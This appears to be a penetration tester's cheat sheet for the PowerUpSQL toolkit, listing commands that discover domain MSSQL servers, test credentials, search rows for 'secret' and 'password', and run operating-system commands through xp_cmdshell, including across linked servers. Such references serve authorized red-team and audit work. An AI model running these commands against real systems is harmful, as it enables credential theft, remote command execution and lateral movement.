### Source
https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1  

### Discover active directory domain SQL server
```
Get-SQLInstanceDomain -Verbose -DomainController &lt;dc&gt; | Get-SQLServerinfo -Verbose
```

### List accessible SQL server using credentials
```
Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username &lt;user&gt; -password &lt;password&gt; | Where-Object {$_.Status -like "Accessible"}
```

### Get information from specific instance
```
Get-Sqlserverinfo -instance &lt;instance&gt;
```

### Scan for misconfiguration
```
Invoke-sqlaudit -instance &lt;instance&gt;
```

### Search database rows for specific keywords (NoDefaults skip default tables)
```
Get-SQLColumnSampleData –Verbose –Keyword "secret,password" –SampleSize 10 –NoDefaults -Instance &lt;instance&gt;
```

### Execute command
```
Invoke-SQLOSCmd -Instance &lt;instance&gt; -Command '&lt;command&gt;' -RawResults
```

### Execute query
```
Get-SQLQuery -Instance &lt;instance&gt; -Query 'SELECT * FROM master..sysservers'
```

### Scan for linked databases
```
Get-SQLServerLinkCrawl -Instance &lt;instance&gt;
```

### Execute commands on linked instances
```
Get-SQLServerLinkCrawl -Instance &lt;instance&gt; -Query "exec master..xp_cmdshell '&lt;command&gt;'"
```

### Excute command on linked mssql instance via instance (xp_cmdshell can not be enabled by OpenQuery)
```
Get-SQLServerLinkCrawl -Instance &lt;instance&gt; -Query "exec master..xp_cmdshell '&lt;command&gt;' "
```


